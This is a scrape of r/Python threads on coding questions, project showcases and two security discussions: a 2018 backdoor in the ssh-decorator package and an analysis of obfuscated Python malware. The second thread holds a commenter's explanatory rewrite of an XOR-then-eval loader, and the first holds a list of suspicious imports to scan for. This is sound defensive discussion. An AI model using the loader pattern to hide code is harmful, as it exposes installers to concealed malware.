                    "content": "True is only equal to itself and there's only one instance of True, so I think we're entering the realm of Philosophy. BTW, I sometimes use, especially in assertions, this \"double implication\" pattern: bool(...) == bool(...)"
                },
                {
                    "author": "JamzTyson",
                    "score": "1",
                    "content": "why \"if greeting is True\" is \"Worse\" Consider if greeting is an empty string: greeting = \"\" bool(greeting)  # False, as expected. greeting is True  # False greeting is False  # False, OMG! greeting = \"Non-empty string\" greeting is True  # False OMG! When using is we compare identities. An empty string is a different kind of object than the bool literal False, so object is True will be false for any object that is not a bool True object, and object is False will be false for any object that is not literally a bool False object. On the other hand, strings have \"truthiness\". A non-empty string evaluates to True and an empty string evaluates to False."
                }
            ]
        },
        {
            "author": "growlithe49",
            "score": "1",
            "content": "Howdy! Please redirect me if I'm in the wrong place! I created a field in an attribute table called Link with a hyperlink to folders on my drive to easily navigate to them when needed. I want to move the documents to a new location but am finding I can't figure out how to use the Field Calculator to insert text with the new link. As an example, the old directory is: C:\\Users\\jimbob\\links and I decided to move the folders to C:\\Users\\jimbob\\iTunes\\music\\links I was hoping I could just add new text in using: !Link![0:15] + \"music\\\" + !Link![15:] or just creating a new field and trying New Link = \"C:\\Users\\jimbob\\iTunes\\music\\links\" However, I just made it angry at me (probably justifiably). Would anyone know how I could insert the new info? Thank you for your help!"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bv8m0o",
    "post_score": "2",
    "post_time": "Thursday, April 4, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "kinakokuromitsu",
            "score": "2",
            "content": "I finished the book “Automate the Boring Stuff”. What are some other books or resources you would recommend? I’m interested in data analysis in particular.",
            "replies": [
                {
                    "author": "NoumenaSolarCoaster",
                    "score": "1",
                    "content": "I don’t know what the consensus here is on Dataquest but I found it to be super helpful in learning Python, specifically in the domain of data analysis. If you cannot or do not want to pay for courses, Kaggle has many free courses for data analysis and data science using Python. Kaggle also has a ton of free datasets to practice on once you cruise through a few courses. I am currently a finance analyst and I feel that I owe my entry into the field to what I learned on Dataquest though!"
                },
                {
                    "author": "riklaunim",
                    "score": "1",
                    "content": "Data analysis is very broad and needs context, like the comment here of a finance analyst. If you are developer first and only then your data analysis may limit to databases, API and typical backend development for web apps or APIs.",
                    "replies": [
                        {
                            "author": "kinakokuromitsu",
                            "score": "2",
                            "content": "This helped me understand how far I still have to go. Hopefully some more context helps, as my studies weren't in software development. I come from an Accounting and Finance background, and so most of my data analysis came in the form of financial analysis. In other words, quite simple compared to the statistical analysis that a data scientist/analyst might do. My Python usage in a work setting has been limited because I don't have a skillset or education as a developer. I have built some simple tools such as using an API to extract, transform, and load data into a database. A different script would run automated reports periodically and e-mail them to clients. I guess I should not limit my learning journey at the moment because of my lack of experience, but it also makes it tricky to understand where to start. I chose data analysis because I currently work as a Business Analyst, so I would be able to start integrating Python usage into my work over simply using Excel, in the hopes that the work application will give me a chance into more Developer or Data Scientist work. My gut is telling me that I should lean more towards general Development because there is a bigger market to serve, whereas I feel like many organizations don't have a need for Data Science.",
                            "replies": [
                                {
                                    "author": "riklaunim",
                                    "score": "2",
                                    "content": "Companies may forbid their non-developers from making applications/tools due to bugs/unknown application cost and then have dedicated developers to code what's needed. Going wide is a good idea, just note that the junior market is oversaturated and it will take a lot of applications to land a job and start a dev career. If you are really into this and want to code daily then you have a good start."
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    ]
},
{
    "post_author": "Extreme-Acid",
    "post_id": "1bpzfcb",
    "post_score": "20",
    "post_time": "Thursday, March 28, 2024 at 7:12:47 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python state management",
    "media": [],
    "post_content": "Hey all,\nI love what Django has with django-fsm. I require something but without Django, as there is no user interaction with the workflow. All inputs and outputs are either rabbitmq or another api. This is to be a workflow management system.\nI am looking for state management backed up by database so we can not suffer if a k8s pod dies with all the states in memory. Some of our workflows could take weeks.\nIs it still best to make this in Django or is there a database backed state management module available?\nI see pytransitions but I would have to add database logging to it.",
    "comments": [
        {
            "author": "BigHeed87",
            "score": "15",
            "content": "Why not store the state in the database? Otherwise it sounds like you need a fault tolerant memory store. Redis?",
            "replies": [
                {
                    "author": "Extreme-Acid",
                    "score": "1",
                    "content": "Yeah that is a good idea, thanks"
                }
            ]
        },
        {
            "author": "crawl_dht",
            "score": "8",
            "content": "Long workflows like yours can be outsourced to Apache Airflow. Apache Airflow is not just a job scheduler, but is also an orchestrator. It will manage the state of your workflow and it has lot of failsafes in case of failures.",
            "replies": [
                {
                    "author": "Extreme-Acid",
                    "score": "2",
                    "content": "This is very interesting. We are on Azure and I see it is offered as a service, but not as mature as aws. I may just make my own airflow server. Thanks I will evaluate this!"
                }
            ]
        },
        {
            "author": "wyldstallionesquire",
            "score": "6",
            "content": "I would only base it on Django if you specifically want some other aspect of Django involved. The orm, admin, django-ninja, etc. Otherwise you should probably pick an appropriate fsm library and tool up your persistence however makes sense. Or check out temporal, which basically solves your problem for you"
        },
        {
            "author": "alicedu06",
            "score": "2",
            "content": "Honestly, sometimes I just pull django for the ORM and the web admin that comes with it, not even using the web part. You can access the whole DB side of it without any web server with 6 lines of Python. Not need for manage.py, not need to start a process. And Django is just a few mb. My client doesn't need to know. And then later I discover I'd like a quick and dirty UI for my service anyway, and I'm happy django is in there.",
            "replies": [
                {
                    "author": "Extreme-Acid",
                    "score": "1",
                    "content": "Yeah I think that is one of the options I need to look into."
                }
            ]
        },
        {
            "author": "robertocarlosmedina",
            "score": "1",
            "content": "Detecting & Counting coins on images with Python using OpenCV: https://youtu.be/VrgI1nPbV88"
        }
    ]
},
{
    "post_author": "Plastic-Payment-934",
    "post_id": "1blo65t",
    "post_score": "46",
    "post_time": "Saturday, March 23, 2024 at 12:28:11 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Chat with your friends within your (Mac & Linux) Terminal | Textual | Simple & Easy to use",
    "media": [
        "https://textual.textualize.io/",
        "https://github.com/MuongKimhong/toschat"
    ],
    "post_content": "Toschat !What My Project Does?\na lightweight python chat app within your terminal with simple UI and it's built on top of Textual framework. What you can do:\n- Create a new account\n- Add your friends to your contact\n- and chat!\nTarget Audience\nIt's my hobby project to improve my python knowledge but everyone can install and use it. All data store in a live server with Django framework.\nComparison\nInstead of texting with your colleagues or your friends on your phone or a web browser, .. why not your terminal ? 😁\nI'm happy for advices on code improvements, features recommendations and feedbacks. 😁😁\nGithub Link: https://github.com/MuongKimhong/toschat\nIf you find it interesting and useful, give it a star I would appreciate it very much.Have a good weekend programmers!",
    "comments": [
        {
            "author": "PosauneB",
            "score": "8",
            "content": "Would you consider contributions from the public? Seems like it could be a cool project to contribute to!",
            "replies": [
                {
                    "author": "Plastic-Payment-934",
                    "score": "2",
                    "content": "Absolutely!! Contributions are welcome. Feel free to explore the project and contribute in any way that you find interesting."
                }
            ]
        },
        {
            "author": "pb_problem_solving",
            "score": "5",
            "content": "what protocol does it use? who runs the server?",
            "replies": [
                {
                    "author": "Plastic-Payment-934",
                    "score": "4",
                    "content": "it uses https and websocket protocol. I deployed the server on digitalocean.",
                    "replies": [
                        {
                            "author": "pb_problem_solving",
                            "score": "6",
                            "content": "cool, code reveals that you have invested a proper workload in it.",
                            "replies": [
                                {
                                    "author": "Plastic-Payment-934",
                                    "score": "1",
                                    "content": "thanks you !"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "sonobanana33",
            "score": "3",
            "content": "So you don't chat with friends using write(1)"
        },
        {
            "author": "mnvoh",
            "score": "2",
            "content": "I really like Textual, which makes me like your project even more. And that's why you get a ⭐. P.S: To everyone who's saying why, not every project has to be 100% practical. Sometimes it's just fun, sometimes it's just a PoC, etc. Also, beauty is in the eye of the beholder.",
            "replies": [
                {
                    "author": "Plastic-Payment-934",
                    "score": "1",
                    "content": "thanks you 😀! Textual and its community are just awesome."
                }
            ]
        },
        {
            "author": "ta1901",
            "score": "2",
            "content": "Neat! I'm a Pynoob, so this will help me understand chat programs.",
            "replies": [
                {
                    "author": "Plastic-Payment-934",
                    "score": "1",
                    "content": "😁😁"
                }
            ]
        },
        {
            "author": "nderstand2grow",
            "score": "1",
            "content": "All data store in a live server backed by Django framework. Thanks for the honesty. At least you're not pretending the data is private. Edit: I was not being sarcastic."
        },
        {
            "author": "Wallstreetbettss",
            "score": "-1",
            "content": "Ummm why can’t you just use your message app o no the Mac that is linked to you phone",
            "replies": [
                {
                    "author": "Plastic-Payment-934",
                    "score": "1",
                    "content": "it's just a project to do in my free time. I'm sure there are so many better and cool apps out there."
                }
            ]
        },
        {
            "author": "Wallstreetbettss",
            "score": "-2",
            "content": "I feel like you’re just reinventing the wheel here",
            "replies": [
                {
                    "author": "JacobD393",
                    "score": "1",
                    "content": "I feel like that's the point. In coding if you want to build a car it's a great idea to reinvent the wheel first! So that if it breaks, you know why and how to fix it. Sometimes a program has no use other than the skill you practice and research developing it, that by itself is a surefire way to tackle bigger and bigger projects. Great work OP, small projects can have massive work put into it behind, and in projects like yours, I can only imagine! It's way out of my skillset"
                }
            ]
        }
    ]
},
{
    "post_author": "TheJizzWiz",
    "post_id": "f17mfh",
    "post_score": "1703",
    "post_time": "Sunday, February 9, 2020 at 2:45:01 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I made a random maze generator",
    "media": [
        "https://i.redd.it/1cfxaqvmyvf41.png",
        "https://preview.redd.it/1cfxaqvmyvf41.png?width=640&crop=smart&auto=webp&s=f3e7b283fcc4d843706160c42b835298705bc0ca"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "sissyadmiration",
            "score": "241",
            "content": "heavy breathing in Minotaur",
            "replies": [
                {
                    "author": "cybaritic",
                    "score": "57",
                    "content": "screams in Theseus"
                }
            ]
        },
        {
            "author": "orokro",
            "score": "80",
            "content": "This just looks like an evil crossword puzzle generator."
        },
        {
            "author": "TheJizzWiz",
            "score": "106",
            "content": "Heres the link to the code: https://github.com/ChickenSlayer3000/Random-Maze-Generator Note: Ive only been learning python for about a month and a half now, so any recomendations on how to improve my code would be appreciated",
            "replies": [
                {
                    "author": "anotherMiguel",
                    "score": "49",
                    "content": "You made this from scratch? Impressive! Congratulations!"
                }
            ]
        }
    ]
},
{
    "post_author": "Shay-Hill",
    "post_id": "1buwnrt",
    "post_score": "6",
    "post_time": "Wednesday, April 3, 2024 at 7:15:06 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Docx2Python 2.10.0 will now extract comments from Word files",
    "media": [
        "https://github.com/ShayHill/docx2python"
    ],
    "post_content": "access comments with Docx2Python\nYou can access docx comments with the comments attribute of the output DocxContent object.\nwith docx2python('path/to/file.docx') as docx_content:\n    print(docx_content.comments)\nFor each comment, this will return a tuple:\n(reference_text, author, date, comment_text)\nhttps://github.com/ShayHill/docx2python",
    "comments": []
},
{
    "post_author": "[deleted]",
    "post_id": "8hvzja",
    "post_score": "1658",
    "post_time": "Tuesday, May 8, 2018 at 2:37:20 PM GMT+3",
    "flair_text": "",
    "post_title": "Backdoor in ssh-decorator package",
    "media": [
        "https://preview.redd.it/zu0guck3cmw01.png?width=819&format=png&auto=webp&s=91772cecb537bbac3c364af80c0a824a42714421",
        "https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fibb%2Eco%2FkdDk67&urlhash=SFzn&_t=tracking_anet",
        "https://pypi.org/project/ssh-decorate/#files"
    ],
    "post_content": "Do not install or use the ssh-decorator package from Pip. It has a backdoor inserted to steal all your SSH credentials. I've already contacted the developer to take it out. He hasn't responded so for now, use at your own risk! https://ibb.co/kdDk67\nUPDATE: The compromised package has been taken down now.",
    "comments": [
        {
            "author": "hansaw",
            "score": "918",
            "content": "We always say “it’s open, it must be ok otherwise someone would notice”. The truth is though that it’s thanks to people like you who take the effort to go through cose and report bad stuff that we can work safely Thanks man!",
            "replies": [
                {
                    "author": "Tito1337",
                    "score": "57",
                    "content": "Yep, thank you OP !"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "Funny you mentioned that post, I've also checked the github. It uses requests because the packacke is just a thin wrapper around GET requests + beautifulsoup to online dictionaries. But that one was obviously some hobby/learning project, so (hopefully) nobody should have seriously considered to use this in production :) When it comes to installing network specific packages, I'm too scared to use anything but major well-known libraries. Agreed, but even then: The real issue are obfuscated backdoors in sub-sub-sub-dependencies. Unless every maintainer in the dependency chain audits new versions (and not the github version of the code - the code that was actually published to PIP!), that's just continuing to be a risk. Network monitoring is a good idea, but there are ways to detect this and not trigger in those cases. There was a good post about how someone could do something like this with JS/npm maybe a few months ago. I think it was on medium.com, but I sadly can't find it anymore... What we would need is a module system that allows us to limit the permissions of dependencies on a package-to-package basis, like in smartphone apps, but that's not likely to be around anytime soon. In the meantime, there is only one thing we can do: Assume that, if a popular package gets compromised, much larger companies will be screwed as well so you might be able to fly below the radar of the shitstorm.",
                    "replies": [
                        {
                            "author": "Taedalus",
                            "score": "32",
                            "content": "Funny you mentioned that post, I've also checked the github. It uses requests because the packacke is just a thin wrapper around GET requests + beautifulsoup to online dictionaries. But that one was obviously some hobby/learning project, so (hopefully) nobody should have seriously considered to use this in production :) When it comes to installing network specific packages, I'm too scared to use anything but major well-known libraries. Agreed, but even then: The real issue are obfuscated backdoors in sub-sub-sub-dependencies. Unless every maintainer in the dependency chain audits new versions (and not the github version of the code - the code that was actually published to PIP!), that's just continuing to be a risk. Network monitoring is a good idea, but there are ways to detect this and not trigger in those cases. There was a good post about how someone could do something like this with JS/npm maybe a few months ago. I think it was on medium.com, but I sadly can't find it anymore... What we would need is a module system that allows us to limit the permissions of dependencies on a package-to-package basis, like in smartphone apps, but that's not likely to be around anytime soon. In the meantime, there is only one thing we can do: Assume that, if a popular package gets compromised, much larger companies will be screwed as well so you might be able to fly below the radar of the shitstorm."
                        },
                        {
                            "author": "SmellsLikeGrapes",
                            "score": "19",
                            "content": "Consider adding \"paramiko\", \"subprocess\" and \"socket\" to the imports you scan for. Other items you might consider checking for is \"smtp\" and \"email\", as there's at least one open source python backdoor that uses SMTP for sending and receiving commands."
                        },
                        {
                            "author": "iceardor",
                            "score": "8",
                            "content": "In the future, I'd like to see application-specific restrictions: what parts of the hard drive an application can read and write, what web addresses an application can communicate with, what devices an application can access, and what regions of memory an application can access. OS's, VM's, hypervisors, and firewalls collectively do this, but not as ubiquitous and cross platform as it should be."
                        },
                        {
                            "author": "musashisamurai",
                            "score": "7",
                            "content": "Last semester, in my cyber class, one final project was doing essentially that. They scanned git projects and did static analysis of the code. Definitely a tool that cpuld be developed further"
                        },
                        {
                            "author": "immibis",
                            "score": "5",
                            "content": "Warning! The spez alarm has operated. Stand by for further instructions."
                        },
                        {
                            "author": "yungboof",
                            "score": "2",
                            "content": "SMTP libs for uploading mail docs containing useful info."
                        }
                    ]
                }
            ]
        },
        {
            "author": "gristc",
            "score": "82",
            "content": "Why is your link to ibb.co a redirect via Linkedin?"
        },
        {
            "author": "etrnloptimist",
            "score": "123",
            "content": "With no hint of obfuscation and in a language as readable as python. That takes some chutzpah."
        },
        {
            "author": "simtel20",
            "score": "112",
            "content": "They seem to indicate that they didn't mean it to be uploaded. The readme says: Important note ! It has been brought to our attention, that previous versions of this module had been hijacked and uploaded to PyPi unlawfully. Make sure you look at the code of this package (or any other package that asks for your credentials) prior to using it. But the cached google copy of the pypi page shows the uploader as ugoren who appears to be the same person as the owner of the github repo I linked to."
        },
        {
            "author": "h4xrk1m",
            "score": "29",
            "content": "This gave me an idea. If I stick \"ssh-decorate.cf\" in my hosts file, but point it to my own server, then I can see if anything already running on my machines has been affected. I think I'll set something like that up right now.` Edit: Here it is! Keep in mind that this is about 1 hour of work, so I'm sure there's bugs and problems I haven't seen or thought about. Let me know if you see something!"
        },
        {
            "author": "xdcountry",
            "score": "25",
            "content": "PyPi should find a way to lifetime ban assholes who do this. Also, certain scans (public and private) should be common place so something like this is a bit easier to flag/find."
        },
        {
            "author": "monim67",
            "score": "44",
            "content": "Yeah, the package is down now, people are so evil!!!"
        },
        {
            "author": "davidkwast",
            "score": "12",
            "content": "https://github.com/urigoren/ssh_decorator Important note ! It has been brought to our attention, that previous versions of this module had been hijacked and uploaded to PyPi unlawfully. Make sure you look at the code of this package (or any other package that asks for your credentials) prior to using it."
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1bqavv5",
    "post_score": "3",
    "post_time": "Friday, March 29, 2024 at 3:00:56 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "aboutandre",
            "score": "1",
            "content": "Hi everyone, I hope this is the right place to ask this: How do I implement concrete references instead of magic strings? Should I even do this or is this not the Python way? Example: I'm following a Python/Django course and while writing a test we are calling a decorator like this: u/patch('core.management.commands.wait_for_db.Command.check') class CommandTests(SimpleTestCase): ... I feel very uncomfortable passing wild strings without having anyway to know where they're coming from. So I thought I could do something like this (see str()): @patch(str(core.management.commands.wait_for_db.Command.check)) class CommandTests(SimpleTestCase): ... I had to add each module to their __init__.py files. I manage to get the references up until the Command part, then I get an error: ModuleNotFoundError: No module named '<function BaseCommand' For reference the Command class looks like this: class Command(BaseCommand): Since BaseCommand is not part of my project, but rather from django.core.management.base I don't know how to expose this, so that the decorator works. But my feeling is that this approach is just plain wrong and that in Python magic strings are just a fact of life. Is this so? Background: I'm a 15+ years dev and I'm used to strong typing and passing clear references around. TYSM in advance!"
        },
        {
            "author": "sue_dee",
            "score": "1",
            "content": "I've been working with pandas recently, and it seems hard to make my code more generalized. Indeed, they enable a dot notation to refer to specific column names directly, which flies in the face of my desire to remove hard coding in these functions and supply what I want with parameters. However, as I'm still working the operational logic out, my code stays pretty hard-coded anyway, only using the more dictionary-like notation with constants. I hope to \"bubble up\" all of those in a later tidying phase. Is this misguided? Is pandas just better used in more direct fashion? I'm sure it's possible to generalize it, but is the cost in lessened clarity worth it?"
        }
    ]
},
{
    "post_author": "42-is-the-number",
    "post_id": "1bngiqi",
    "post_score": "231",
    "post_time": "Monday, March 25, 2024 at 6:29:57 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Analyzing Python Malware found in an open-source project",
    "media": [
        "https://medium.com/@aleksamajkic/fake-sms-how-deep-does-the-rabbit-hole-really-go-17e25c42f986"
    ],
    "post_content": "Hi all,\nI've recently found a Python Malware in a FOSS tool that is currently available on GitHub. I've written about how I found it, what it does and who the author is. The whole malware analysis is available in form of an article.\nI would appreciate any and all feedback.",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Thanks. Also, thank you for reading, I'm glad you found some humor in it. No, I've never reached out to him for an explanation.",
            "replies": [
                {
                    "author": "42-is-the-number",
                    "score": "13",
                    "content": "Thanks. Also, thank you for reading, I'm glad you found some humor in it. No, I've never reached out to him for an explanation."
                }
            ]
        },
        {
            "author": "bibiwood",
            "score": "13",
            "content": "Do you mind if I ask what tool did you use for the timeline graphics? It looks really nice.",
            "replies": [
                {
                    "author": "42-is-the-number",
                    "score": "12",
                    "content": "No, not at all. Initially, I was going to create a timeline graphics in Photoshop, but instead I found a Canva template that was exactly what I've envisioned. If you search for Canva timeline template, you should be able to find it."
                }
            ]
        },
        {
            "author": "char101",
            "score": "11",
            "content": "Nice article. If you search wopvEaTEcopFEavc in github, you'll get the project that is used to obsfucate the python code. Also you might save some work by overriding builtins.eval with a function that write the parameter to a text file in sitecustomize.py"
        },
        {
            "author": "julianw",
            "score": "8",
            "content": "Do you have a non-medium link?"
        },
        {
            "author": "laterral",
            "score": "7",
            "content": "You should audit many other FOSS tools"
        },
        {
            "author": "PrometheusAlexander",
            "score": "10",
            "content": "Wow. Excellent work and good article! So he used eval to run the obfuscated code, but what made python know how to unobfuscate it? That part was a bit hazy for me.",
            "replies": [
                {
                    "author": "42-is-the-number",
                    "score": "13",
                    "content": "Thanks. While the code is obfuscated (not easy to read and understand for humans), it is still Python code which is understood by a computer. Python eval() is used to dynamically evaluate expressions from a string-based or compiled-code-based input. Here, the malware author used both, string-based and compile-code-based input. While there is a lot of code there, the only important information was the variable that was used inside the eval() expression, which contained the next layer of obfuscated code. For the first layer that was the oIoeaTEAcvpae variable, for the second layer it was the AAaa variable etc. You could imagine it something like this: eval(oIoeaTEAcvpae) ├─ eval(AAaa) ├─ ... ├─ eval(source_code)"
                },
                {
                    "author": "GrowlingM1ke",
                    "score": "7",
                    "content": "I was curious about that myself, so I rewrote the code in the snippet with sensible variable names and it made much more sense. string_of_chars = \"OBFUSCATED_CODE_BLABLABLA...\" string_of_numbers = \"571932651092361234\" length_of_code = len(string_of_chars) deobfuscated_code = \"\" # We iterate through all the characters of the obfuscated code and we process # them one by one. for index in range(length_of_code): # Get the char at current index obfuscated_char = string_of_chars[index] # Extract a number from our string of numbers corresponding to the index # we are on. number_char = string_of_numbers[index % len(string_of_numbers)] # This is where the \"magic\" happens, the ord function converts the chars into integers # then the two integers are XORed with each other before being converted back into a character. # In cryptography XOR is useful because a single key is used for both encryption and decryption. # In other words if you have an integer x and XOR it twice with an integer y, you get the # value of x back again. deobfuscated_code += chr(ord(obfuscated_char) ^ ord(number_char)) eval(compile(deobfuscated_code, '<string>', 'exec')) Edit1: Just to really make it clear: initial_value = 1 key = 19 obfuscated_value = initial_value ^ key deobfuscated_value = obfuscated_value ^ key print(obfuscated_value) print(deobfuscated_value) Gives the output 18 1"
                }
            ]
        }
    ]
},
{
    "post_author": "iamgeoknight",
    "post_id": "1bpzcv7",
    "post_score": "6",
    "post_time": "Thursday, March 28, 2024 at 7:10:08 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Creating a GeoTIFF raster XYZ tile service in python with caching capability",
    "media": [
        "https://spatial-dev.guru/2024/03/24/creating-a-geotiff-raster-xyz-tile-service-in-python-with-caching-capability/"
    ],
    "post_content": "Creating a GeoTIFF raster XYZ tile service in python with caching capability",
    "comments": [
        {
            "author": "Gullible_Carry1049",
            "score": "1",
            "content": "I think this is useful to understand that it doesn't take a ton of code to implement a basic tile server. It may be useful to reference to titiler in the article https://developmentseed.org/titiler/ a full featured implementation that works with FastAPI in addition to creating one from scratch with minimal dependencies."
        }
    ]
},
{
    "post_author": "Pleasant-Cow-3898",
    "post_id": "1blektf",
    "post_score": "80",
    "post_time": "Saturday, March 23, 2024 at 3:14:47 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Designing a Pure Python Web Framework",
    "media": [
        "https://reflex.dev/blog/2024-03-21-reflex-architecture/#designing-a-pure-python-web-framework"
    ],
    "post_content": "From the Article:\nThis provides a good overview of how Reflex works under the hood.\nTLDR:\nUnder the hood, Reflex apps compile down to a React frontend app and a FastAPI backend app. Only the UI is compiled to Javascript; all the app logic and state management stays in Python and is run on the server. Reflex uses WebSockets to send events from the frontend to the backend, and to send state updates from the backend to the frontend.\nFull post: https://reflex.dev/blog/2024-03-21-reflex-architecture/#designing-a-pure-python-web-framework",
    "comments": [
        {
            "author": "DaelonSuzuka",
            "score": "29",
            "content": "I've been using NiceGUI for a year and it's been fantastic. Is there a reason I'd want to use Reflex instead of NiceGUI? It's not mentioned in your \"existing python solutions\" section, but from what I can see it's actually your closest competitor.",
            "replies": [
                {
                    "author": "mr_claw",
                    "score": "4",
                    "content": "I really like NiceGUI. Pywebio is amazing too, and better than Nicegui when you want to be really quick to deploy.",
                    "replies": [
                        {
                            "author": "DaelonSuzuka",
                            "score": "5",
                            "content": "Pywebio gives me a similar vibe as Streamlit: slightly easier to go from nothing to something (especially as a new user), but is going to be a huge pain in the ass to iterate on.",
                            "replies": [
                                {
                                    "author": "CloudFaithTTV",
                                    "score": "1",
                                    "content": "That sums up lots of these tools for me, streamlit being the biggest and Tkinter being a very close second."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "yvrelna",
            "score": "33",
            "content": "compile to React Good gosh, you couldn't have chosen a worst target to compile to.",
            "replies": [
                {
                    "author": "Pleasant-Cow-3898",
                    "score": "11",
                    "content": "Why is that the worst target to compile to? Its the largest eco system so most libraries have a react port."
                },
                {
                    "author": "n_Oester",
                    "score": "6",
                    "content": "I’m also interested to learn why people are so anti-react?"
                }
            ]
        },
        {
            "author": "gabel0287",
            "score": "20",
            "content": "Seems overly complicated. Why not use Python and HTMX?",
            "replies": [
                {
                    "author": "Pleasant-Cow-3898",
                    "score": "10",
                    "content": "The actual code the user writes is pretty straight forward. Htmx doesn't do state management, so for more complex use cases it can be tough. That's where the complexity in the architecture comes from, managing and handling state. Especially as your app grows in terms of size and features."
                }
            ]
        },
        {
            "author": "Ok-master7370",
            "score": "5",
            "content": "I've been following yall development through reddit posts, looking good my guy"
        },
        {
            "author": "Afraid-Bread-8229",
            "score": "3",
            "content": "OP, are you the author of the library?"
        },
        {
            "author": "Afraid-Bread-8229",
            "score": "4",
            "content": "I’m 100% on board with this. Exactly what I was looking for. Compiling down to Next.js and FastAPI? 😍😍😍"
        },
        {
            "author": "DowntownSinger_",
            "score": "2",
            "content": "Any particular reason why you chose websockets ?"
        },
        {
            "author": "gireeshwaran",
            "score": "2",
            "content": "That is awesome. I was planning on learning flutter for making some web apps but maybe not. Kudos for this!!!"
        },
        {
            "author": "Furrynote",
            "score": "2",
            "content": "Came here to comment that reflex already does this… what do ya know"
        },
        {
            "author": "[deleted]",
            "score": "-8",
            "content": "Reported for spamming in some subs",
            "replies": [
                {
                    "author": "KingsmanVince",
                    "score": "2",
                    "content": "Reported for spamming in some subs"
                }
            ]
        }
    ]
},
{
    "post_author": "WigglytufTehPink",
    "post_id": "gtzk7v",
    "post_score": "1696",
    "post_time": "Sunday, May 31, 2020 at 5:06:48 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I created the first cross-platform Python library to create native context menus!",
    "media": [
        "https://preview.redd.it/qss2hn4ix3251.gif?width=640&crop=smart&format=png8&s=c04b57cb6bc0f20197567784aa00719e21bf08c0"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "WigglytufTehPink",
            "score": "148",
            "content": "You can check out the code here: https://github.com/saleguas/context_menu Easily the most painful thing I've ever created, but boy am I glad how it came out. There is little to none information on context menus anywhere, and a while ago I just wanted to create a simple file sorter and it was waaay harder then it should have been. So I decided to make this library so any other developers don't have to go through the pain I went through. Please give any and all feedback!",
            "replies": [
                {
                    "author": "KingsmanVince",
                    "score": "24",
                    "content": "This will save us so much time. Thanks for making this.",
                    "replies": [
                        {
                            "author": "WigglytufTehPink",
                            "score": "24",
                            "content": "No problem, I hopefully had to deal with the nightmare so no one else has to."
                        }
                    ]
                },
                {
                    "author": "SnowdenIsALegend",
                    "score": "7",
                    "content": "Bro, you are AWESOME! THIS IS BEAUTIFUL! Thank you for sharing!"
                },
                {
                    "author": "wpg4665",
                    "score": "8",
                    "content": "Does this also work for Mac?",
                    "replies": [
                        {
                            "author": "MysteryMage",
                            "score": "16",
                            "content": "Based on what i have seen in the code it only supports windows and Linux"
                        },
                        {
                            "author": "RegmasterJ",
                            "score": "14",
                            "content": "If you need something like this for macOS, it’s pretty trivial to write a Python script (or modify this one) and add it as a command to the context menu using Automator. This is what I read to get me started. Edit: typo"
                        },
                        {
                            "author": "WigglytufTehPink",
                            "score": "12",
                            "content": "It only works for Windows and Linux as of now."
                        }
                    ]
                },
                {
                    "author": "chrisdahfuh",
                    "score": "2",
                    "content": "This is just. Amazing. 👍 I cant imagine the work you put into it, and for these OS",
                    "replies": [
                        {
                            "author": "WigglytufTehPink",
                            "score": "2",
                            "content": "Thank you so much!!"
                        }
                    ]
                },
                {
                    "author": "ImARealBoy_",
                    "score": "2",
                    "content": "Really cool stuff! Can’t wait to take a look."
                }
            ]
        },
        {
            "author": "redredditor",
            "score": "60",
            "content": "Looks great! Good job. You may want to enable \"issues\" on github. I saw that \"_ _ pycache _ _\" is checked into source. That dir should be in a .gitignore."
        },
        {
            "author": "wesleywatanabe",
            "score": "14",
            "content": "How difficult is it to get a file and does something? I'm thinking to manipulate by pandas. Great job!"
        },
        {
            "author": "shaggorama",
            "score": "10",
            "content": "Is there a way to undo changes or remove items from the context menu configuration, or encapsulate your changes so they're temporary (without spinning up a docker container or VM or something like that)? This sounds really cool and I want to play with this, but I'm a little afraid of cluttering up my context menus and -- although I only skimmed it -- I don't see any \"cleanup\" examples in your documentation."
        },
        {
            "author": "Tom1380",
            "score": "18",
            "content": "I'm not really sure what it does, can you explain please?"
        },
        {
            "author": "B3N-Drowned",
            "score": "9",
            "content": "Not a hero we need but the hero we deserve"
        },
        {
            "author": "JohnMcPineapple",
            "score": "8",
            "content": "Two questions: The code will automatically prompt for Admin rights if it is not sufficiently elevated. Does this mean your whole python application is elevated, or just a subprocess? Second, is there a way to remove the menu again? I didn't see a mention of that in the readme on first look. Great library however!"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "any good examples of useful custom context menus? i know it's useful but cant think of anything right now."
        },
        {
            "author": "ijxy",
            "score": "5",
            "content": "My pathetic way of doing this is to add a .bat file into the following directory: C:\\Users\\<username>\\AppData\\Roaming\\Microsoft\\Windows\\SendTo Then in this bat file boot the python script: C:\\Python\\Python36-32\\python.exe C:\\Users\\<username>\\Tools\\my_program\\my_script.py %* The last %* is important and gives you the selected files you are applying \"send to\". Finally in the python script you can get a hold of the files full path like this: file_paths = sys.argv[1:] And get the folder you are \"send to\"-ing from: root_path = os.getcwd() Result: https://i.imgur.com/oVSNsaf.png All that said. I'd rather use what OP is doing here, so will be looking into it."
        },
        {
            "author": "tonniegames79",
            "score": "4",
            "content": "Thanks"
        }
    ]
},
{
    "post_author": "databot_",
    "post_id": "1bnxrux",
    "post_score": "15",
